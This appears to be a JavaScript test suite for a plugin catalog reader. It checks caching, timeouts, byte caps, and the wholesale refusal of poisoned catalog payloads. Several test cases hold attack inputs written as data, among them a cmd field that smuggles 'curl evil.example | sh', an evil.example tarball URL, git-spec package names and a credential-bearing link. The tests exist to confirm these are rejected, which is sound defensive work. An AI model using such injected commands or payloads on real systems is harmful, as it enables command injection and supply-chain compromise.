/**
 * The online catalog reader.
 *
 * Requests are faked: this file never touches the network, the user's profile or any real catalog.
 * The bundled catalog is the repository's own catalog/catalog.json (read here, as the Host ships it),
 * and the payloads that must be REFUSED are built from it so every rejection is about the rule
 * being tested rather than about a fixture that was wrong to begin with.
 *
 * The point of the feature: a new VibeDev plugin committed to the catalog on main is picked up with
 * no new client. The `@vibedev-si/future-plugin` fixture is that proof.
 */

import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import * as R from '../remote-catalog.js'
import { validateCatalog, catalogErrors } from '../catalog-validator.js'

const here = dirname(fileURLToPath(import.meta.url))
const BUNDLED = JSON.parse(readFileSync(join(here, '..', 'catalog', 'catalog.json'), 'utf8'))
const clone = (v) => structuredClone(v)
let n = 0
const t = (name, fn) => { fn(); n++; console.log('ok  ' + name) }
const ta = async (name, fn) => { await fn(); n++; console.log('ok  ' + name) }

/** A read-only transport: counts calls, and answers with whatever the case wants. */
function transport(answers) {
  const calls = []
  let index = 0
  const doFetch = async (url, init) => {
    calls.push({ url, init })
    const answer = typeof answers === 'function' ? answers(calls.length) : answers[Math.min(index++, answers.length - 1)]
    if (answer instanceof Error) throw answer
    return answer
  }
  return { doFetch, calls }
}
const ok200 = (body, headers = {}) => ({ ok: true, status: 200, headers: { get: (k) => headers[k.toLowerCase()] ?? null }, text: async () => body })
const status = (code) => ({ ok: false, status: code, headers: { get: () => null }, text: async () => '' })
const json = (payload) => ok200(JSON.stringify(payload))
/** A valid entry for a plugin nobody has heard of yet: this is what the online catalog exists for. */
const futurePlugin = {
  id: '@vibedev-si/future-plugin',
  npm: '@vibedev-si/future-plugin',
  version: '1.0.0',
  publishedAt: '2026-10-01T00:00:00.000Z',
  origin: 'official',
  role: 'official',
  updates: 'center',
  name: { zh: '未来插件', en: 'Future Plugin' },
  tagline: { zh: '以后新增的插件', en: 'A plugin added later' },
  does: { zh: ['做一件事'], en: ['Does one thing'] },
  tags: ['official'],
  requires: [],
  partners: [],
  legacyNames: [],
  sizeKB: 120,
  capabilities: [{ key: 'network', text: { zh: '联网', en: 'Network' } }],
  links: { repo: 'https://github.com/VibeDev-Si/dsh-future-plugin', npm: 'https://www.npmjs.com/package/@vibedev-si/future-plugin' },
  cmd: 'dsh plugin add @vibedev-si/future-plugin@1.0.0',
  icon: { glyph: { zh: '未', en: 'F' }, grad: ['#111111', '#222222'] },
}
const withFuture = () => { const c = clone(BUNDLED); c.plugins.push(clone(futurePlugin)); return c }

// ── the validator the reader trusts ─────────────────────────────────────────
t('the shipped catalog passes the shared validator', () => {
  const verdict = validateCatalog(BUNDLED)
  assert.deepEqual(verdict.errors, [])
  assert.equal(verdict.ok, true)
  assert.deepEqual(verdict.counts, { plugins: BUNDLED.plugins.length, suites: BUNDLED.suites.length })
})
t('catalogErrors is the list the script needs', () => {
  assert.deepEqual(catalogErrors(BUNDLED), [])
  assert.ok(catalogErrors({ schema: 2 }).some((e) => e.includes('schema must be one of')))
  assert.ok(catalogErrors({ schema: 2 }, { schemas: [1, 2] }).every((e) => !e.includes('schema')), 'a caller may accept a newer format')
})
t('a new team-owned plugin passes, whatever it is called', () => {
  assert.deepEqual(validateCatalog(withFuture()).errors, [])
})
t('the validator never throws, whatever it is handed', () => {
  for (const junk of [null, undefined, 0, 'x', [], {}, { schema: 1 }, { plugins: 'no' }]) {
    const verdict = validateCatalog(junk)
    assert.equal(verdict.ok, false)
    assert.ok(Array.isArray(verdict.errors) && verdict.errors.length > 0)
  }
})

// ── the reader: the fixed source, read plainly ──────────────────────────────
await ta('reads the fixed source with a plain GET and no caller input', async () => {
  const { doFetch, calls } = transport([json(withFuture())])
  const reader = R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED })
  assert.equal(reader.source, R.CATALOG_URL)
  assert.equal(reader.read.length, 0) // read() takes no arguments at all
  const out = await reader.read()
  assert.equal(out.source, 'online')
  assert.equal(out.error, undefined)
  assert.match(out.checkedAt, /^\d{4}-\d\d-\d\dT/)
  assert.equal(calls.length, 1)
  assert.equal(calls[0].url, R.CATALOG_URL)
  assert.equal(calls[0].init.method, 'GET')
  assert.equal(calls[0].init.redirect, 'error', 'a redirect is never followed')
  assert.equal(calls[0].init.credentials, 'omit')
  assert.equal(calls[0].init.body, undefined)
  assert.equal(calls[0].init.headers.Authorization, undefined)
  assert.deepEqual(Object.keys(calls[0].init.headers), ['accept'])
})
await ta('NEW PLUGIN: an entry added to the catalog on main is served with no new client', async () => {
  const { doFetch } = transport([json(withFuture())])
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED }).read()
  const ids = out.catalog.plugins.map((p) => p.id)
  assert.ok(ids.includes('@vibedev-si/future-plugin'), 'the new package name must be listed')
  assert.ok(!BUNDLED.plugins.some((p) => p.id === '@vibedev-si/future-plugin'), 'and it is genuinely new')
  assert.equal(out.stale, undefined)
})

// ── caching, coalescing, and the clock ──────────────────────────────────────
await ta('a successful read is reused for five minutes, then checked again', async () => {
  let clock = 1_000_000
  const { doFetch, calls } = transport([json(withFuture()), json(BUNDLED)])
  const reader = R.createCatalogReader(doFetch, () => clock, { bundled: BUNDLED })
  assert.equal((await reader.read()).source, 'online')
  clock += 4 * 60 * 1000
  const cached = await reader.read()
  assert.equal(cached.source, 'cached')
  assert.equal(calls.length, 1, 'inside the window the source is not asked again')
  clock += 2 * 60 * 1000
  const again = await reader.read()
  assert.equal(again.source, 'online')
  assert.equal(calls.length, 2, 'after the window it asks again')
})
await ta('two callers share one request', async () => {
  let release
  const gate = new Promise((r) => { release = r })
  const calls = []
  const doFetch = async () => { calls.push(1); await gate; return json(withFuture()) }
  const reader = R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED })
  const [a, b] = [reader.read(), reader.read()]
  release()
  const [ra, rb] = await Promise.all([a, b])
  assert.equal(calls.length, 1, 'one request, not two')
  assert.equal(ra.catalog.plugins.length, rb.catalog.plugins.length)
})
await ta('without a transport the shipped catalog answers, and that is not an error', async () => {
  const out = await R.createCatalogReader(undefined, Date.now, BUNDLED).read()
  assert.equal(out.source, 'bundled')
  assert.equal(out.catalog.plugins.length, BUNDLED.plugins.length)
  assert.equal(out.error, undefined)
})
await ta('the bundled catalog may also be passed as the third argument itself', async () => {
  const out = await R.createCatalogReader(undefined, Date.now, BUNDLED).read()
  assert.equal(out.catalog.schema, 1)
})

// ── everything that must be refused WHOLE, with the shipped catalog standing in ──
const refusals = [
  ['offline (the request rejects)', new Error('getaddrinfo ENOTFOUND')],
  ['a timeout (the request never answers)', async () => new Promise(() => {})],
  ['an HTTP error', status(500)],
  ['a 404 (the file was moved or removed)', status(404)],
  ['not JSON at all', ok200('<html>nope</html>')],
  ['JSON that is not a catalog', json({ hello: 'world' })],
  ['a payload over the size limit', ok200(JSON.stringify(withFuture()), { 'content-length': String(64 * 1024 * 1024) })],
  ['a poisoned payload that claims a DSH-scoped package', json({ ...withFuture(), plugins: [...withFuture().plugins.map((p, i) => (i === 1 ? { ...p, id: '@deepseek-ai/dsh-media-viewer', npm: '@deepseek-ai/dsh-media-viewer' } : p))] })],
  ['a poisoned payload with a git spec', json({ ...withFuture(), plugins: withFuture().plugins.map((p, i) => (i === 1 ? { ...p, npm: 'github:evil/x', id: 'github:evil/x' } : p)) })],
  ['a poisoned payload with a url', json({ ...withFuture(), plugins: withFuture().plugins.map((p, i) => (i === 1 ? { ...p, npm: 'https://evil.example/x.tgz', id: 'https://evil.example/x.tgz' } : p)) })],
  ['a poisoned payload with a version range', json({ ...withFuture(), plugins: withFuture().plugins.map((p, i) => (i === 1 ? { ...p, version: '^0.2.1' } : p)) })],
  ['a poisoned payload with a removed dependency', json({ ...withFuture(), plugins: withFuture().plugins.map((p, i) => (i === 1 ? { ...p, requires: ['dsh-does-not-exist'] } : p)) })],
  ['a payload that widens the community install surface', json({ ...withFuture(), plugins: [...withFuture().plugins, { ...clone(futurePlugin), id: 'evil-plugin', npm: 'evil-plugin', origin: 'community', role: 'companion', author: 'someone', capabilities: [{ key: 'community', text: { zh: '社区', en: 'Community' } }] }] })],
  ['a payload whose link is not https', json({ ...withFuture(), plugins: withFuture().plugins.map((p, i) => (i === 1 ? { ...p, links: { ...p.links, repo: 'http://github.com/VibeDev-Si/dsh-vibedev' } } : p)) })],
  ['a payload whose official repo is not a VibeDev repository', json({ ...withFuture(), plugins: withFuture().plugins.map((p, i) => (i === 1 ? { ...p, links: { ...p.links, repo: 'https://github.com/evil/x' } } : p)) })],
  ['a payload with a credential/query hijack in a link', json({ ...withFuture(), plugins: withFuture().plugins.map((p, i) => (i === 1 ? { ...p, links: { ...p.links, repo: 'https://user:pass@github.com/VibeDev-Si/dsh-vibedev?x=1' } } : p)) })],
  ['a payload over the plugin limit', json({ ...withFuture(), plugins: [...withFuture().plugins, ...Array.from({ length: 45 }, (_, i) => ({ ...clone(futurePlugin), id: `p${i}`, npm: `@vibedev-si/p${i}` }))] })],
  ['a payload with a dependency cycle', json({ ...withFuture(), plugins: withFuture().plugins.map((p) => (p.id === 'dsh-film' ? { ...p, requires: ['@vibedev-si/dsh-vibedev'] } : p.id === '@vibedev-si/dsh-vibedev' ? { ...p, requires: ['dsh-film'] } : p)) })],
]
for (const [name, answer] of refusals) {
  await ta(`REFUSED: ${name}`, async () => {
    const { doFetch } = transport([answer])
    const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED, timeoutMs: 25, maxBytes: 4096 }).read()
    assert.equal(out.source, 'bundled', 'a refused payload falls back to the shipped catalog')
    assert.ok(typeof out.error === 'string' && out.error.length > 0, 'and says what happened')
    assert.equal(out.catalog.plugins.length, BUNDLED.plugins.length)
  })
}
await ta('a timeout is cut off, not waited on', async () => {
  const { doFetch } = transport([async () => new Promise(() => {})])
  const started = Date.now()
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED, timeoutMs: 25 }).read()
  assert.equal(out.source, 'bundled')
  assert.ok(Date.now() - started < 2000, 'it must not hang the panel')
})

// ── the last good catalog is kept, and a failure is never cached ────────────
await ta('after a good read, a failure keeps the last good catalog (marked stale) and retries next time', async () => {
  let clock = 5_000_000
  const { doFetch, calls } = transport([json(withFuture()), new Error('offline'), json(BUNDLED)])
  const reader = R.createCatalogReader(doFetch, () => clock, { bundled: BUNDLED })
  const first = await reader.read()
  assert.equal(first.source, 'online')
  clock += 6 * 60 * 1000 // past the cache window, so the next read really goes out
  const failed = await reader.read()
  assert.equal(failed.source, 'cached', 'the last good catalog, not the shipped one')
  assert.equal(failed.stale, true)
  assert.match(failed.error, /offline/)
  assert.ok(failed.catalog.plugins.some((p) => p.id === '@vibedev-si/future-plugin'), 'the last good listing is not silently lost')
  const recovered = await reader.read()
  assert.equal(recovered.source, 'online', 'a failure is not cached: the next read tries again')
  assert.equal(calls.length, 3)
})
await ta('a bad payload after a good read does not replace the good catalog', async () => {
  let clock = 9_000_000
  const { doFetch } = transport([json(withFuture()), json({ schema: 1, plugins: [{ id: 'x', npm: 'x' }] })])
  const reader = R.createCatalogReader(doFetch, () => clock, { bundled: BUNDLED })
  await reader.read()
  clock += 10 * 60 * 1000
  const out = await reader.read()
  assert.equal(out.source, 'cached')
  assert.equal(out.stale, true)
  assert.ok(out.catalog.plugins.some((p) => p.id === '@vibedev-si/future-plugin'))
  assert.match(out.error, /refused/)
})
await ta('peek() reports the last known state without a request', async () => {
  const { doFetch, calls } = transport([json(withFuture())])
  const reader = R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED })
  assert.equal(reader.peek().source, 'bundled')
  await reader.read()
  assert.equal(reader.peek().source, 'cached')
  assert.equal(calls.length, 1)
})

// ── the body is capped WHILE it is read, and the deadline covers the body ────
/** A fake response that streams, the way a real one does. */
function streamed(chunks, { ignoreAbort = false, hang = false } = {}) {
  let cancelled = false
  let index = 0
  const body = {
    getReader: () => ({
      read: async () => {
        if (hang) return new Promise(() => {}) // never answers, and (deliberately) ignores the signal
        if (ignoreAbort && cancelled) return { done: true, value: undefined }
        if (index >= chunks.length) return { done: true, value: undefined }
        return { done: false, value: new TextEncoder().encode(chunks[index++]) }
      },
      cancel: async () => { cancelled = true },
    }),
  }
  return { ok: true, status: 200, headers: { get: () => null }, body, text: async () => chunks.join(''), cancelled: () => cancelled }
}

await ta('a streamed body is read and accepted like a whole one', async () => {
  const payload = JSON.stringify(withFuture())
  const { doFetch } = transport([streamed([payload.slice(0, 100), payload.slice(100, 400), payload.slice(400)])])
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED }).read()
  assert.equal(out.source, 'online')
  assert.ok(out.catalog.plugins.some((p) => p.id === '@vibedev-si/future-plugin'))
})
await ta('CAP WHILE READING: a stream over the limit is cancelled, not downloaded to the end', async () => {
  const huge = 'x'.repeat(4096)
  const answer = streamed([huge, huge, huge])
  let cancelledSeen = false
  const { doFetch } = transport([{ ...answer, body: { getReader: () => { const r = answer.body.getReader(); return { read: r.read, cancel: async () => { cancelledSeen = true; await r.cancel() } } } } }])
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED, maxBytes: 512 }).read()
  assert.equal(out.source, 'bundled')
  assert.match(out.error, /byte limit/)
  assert.equal(cancelledSeen, true, 'the stream must be cancelled as soon as the cap is passed')
})
await ta('DEADLINE: a transport that ignores the signal still cannot hang the read', async () => {
  const { doFetch } = transport([streamed(['{'], { hang: true })])
  const started = Date.now()
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED, timeoutMs: 40 }).read()
  const took = Date.now() - started
  assert.equal(out.source, 'bundled')
  assert.match(out.error, /timed out after 40 ms/)
  assert.ok(took < 2000, `the whole read must be over quickly (took ${took} ms)`)
})
await ta('DEADLINE: a fetch that never settles is cut off too', async () => {
  const calls = []
  const doFetch = async () => { calls.push(1); return new Promise(() => {}) }
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED, timeoutMs: 40 }).read()
  assert.equal(out.source, 'bundled')
  assert.match(out.error, /timed out/)
})

// ── commands are regenerated, never echoed from the payload ─────────────────
await ta('the returned catalog carries canonical commands, exact version included', async () => {
  const { doFetch } = transport([json(withFuture())])
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED }).read()
  const film = out.catalog.plugins.find((p) => p.id === 'dsh-film')
  assert.equal(film.cmd, `dsh plugin add dsh-film@${film.version}`)
  assert.equal(BUNDLED.plugins.find((p) => p.id === 'dsh-film').cmd, 'dsh plugin add dsh-film', 'the catalog object we passed in is never modified')
})
await ta('the Host profile is woven in when it knows one', async () => {
  const { doFetch } = transport([json(withFuture())])
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED, profile: 'desktop' }).read()
  assert.equal(out.catalog.plugins[0].cmd, `dsh plugin --profile desktop add ${out.catalog.plugins[0].npm}@${out.catalog.plugins[0].version}`)
  const bundledOut = await R.createCatalogReader(undefined, Date.now, { bundled: BUNDLED, profile: 'desktop' }).read()
  assert.match(bundledOut.catalog.plugins[0].cmd, /^dsh plugin --profile desktop add /, 'the bundled copy is normalised too')
  assert.equal((await R.createCatalogReader(undefined, Date.now, BUNDLED).peek()).catalog.plugins[0].cmd, `dsh plugin add ${BUNDLED.plugins[0].npm}@${BUNDLED.plugins[0].version}`)
})
await ta('a payload cannot smuggle a shell line through cmd', async () => {
  const poisoned = withFuture()
  poisoned.plugins[0].cmd = 'dsh plugin add dsh-film; curl evil.example | sh'
  const { doFetch } = transport([json(poisoned)])
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED }).read()
  assert.equal(out.source, 'bundled', 'the whole payload is refused')
  assert.match(out.error, /cmd must be/)
})
// ── the ecosystem itself is never an entry ─────────────────────────────────
await ta('REFUSED whole: a payload that lists the ecosystem itself', async () => {
  const self = withFuture()
  self.plugins.push({ ...clone(futurePlugin), id: '@vibedev-si/dsh-ecosystem', npm: '@vibedev-si/dsh-ecosystem' })
  // the rule is the validator's, and the reader refuses the payload as a whole
  const errors = catalogErrors(self)
  assert.ok(errors.some((e) => e.includes('not a catalog entry')), 'the validator refuses the self entry')
  const { doFetch } = transport([json(self)])
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED }).read()
  assert.equal(out.source, 'bundled', 'the whole payload falls back to the shipped catalog')
  assert.match(out.error, /dsh-ecosystem/)
  assert.ok(!out.catalog.plugins.some((p) => p.npm === '@vibedev-si/dsh-ecosystem'), 'and it is not in what we hand the Host')
})
// ── the rendered-field rules added for the online catalogue, with negative controls ──
await ta('REFUSED: a rendered field that is not a bilingual string pair (sizeNote)', async () => {
  const objects = withFuture()
  objects.plugins[0].sizeNote = { zh: {} } // an object where the card expects text: this is what crashed React
  assert.ok(catalogErrors(objects).some((e) => e.includes('sizeNote')), 'an object must be refused')
  const halfPair = withFuture()
  halfPair.plugins[0].sizeNote = { zh: '很小' } // no English
  assert.ok(catalogErrors(halfPair).some((e) => e.includes('sizeNote')), 'a half pair must be refused')
  const fine = withFuture()
  fine.plugins[0].sizeNote = { zh: '约 1.5 MB', en: 'about 1.5 MB' }
  assert.deepEqual(catalogErrors(fine), [], 'a legitimate note must still pass')
  const { doFetch } = transport([json(objects)])
  const out = await R.createCatalogReader(doFetch, Date.now, { bundled: BUNDLED }).read()
  assert.equal(out.source, 'bundled', 'the whole payload falls back to the shipped catalog')
  assert.match(out.error, /sizeNote/)
})
await ta('REFUSED: a legacy alias that is not a plain package name', async () => {
  for (const bad of ['https://evil.example/x.tgz', 'github:evil/x', '^1.2.3', 'sub/path']) {
    const poisoned = withFuture()
    poisoned.plugins[0].legacyNames = [bad]
    assert.ok(catalogErrors(poisoned).some((e) => e.includes('legacyNames')), `must refuse ${bad}`)
  }
  const legal = withFuture()
  legal.plugins[1].legacyNames = ['dsh-film-legacy', '@vibedev-si/old-name'] // the old dsh-media shape stays legal
  assert.deepEqual(catalogErrors(legal), [])
})
await ta('REFUSED: a suite with no id, or with a duplicate one', async () => {
  const empty = withFuture()
  empty.suites[0].id = ''
  assert.ok(catalogErrors(empty).some((e) => e.includes('id is required')))
  const dupe = withFuture()
  dupe.suites.push(clone(dupe.suites[0]))
  assert.ok(catalogErrors(dupe).some((e) => e.includes('duplicated')))
  assert.deepEqual(catalogErrors(withFuture()), [], 'the creator fixture must still pass')
})
console.log(`\n${n} remote-catalog tests passed`)
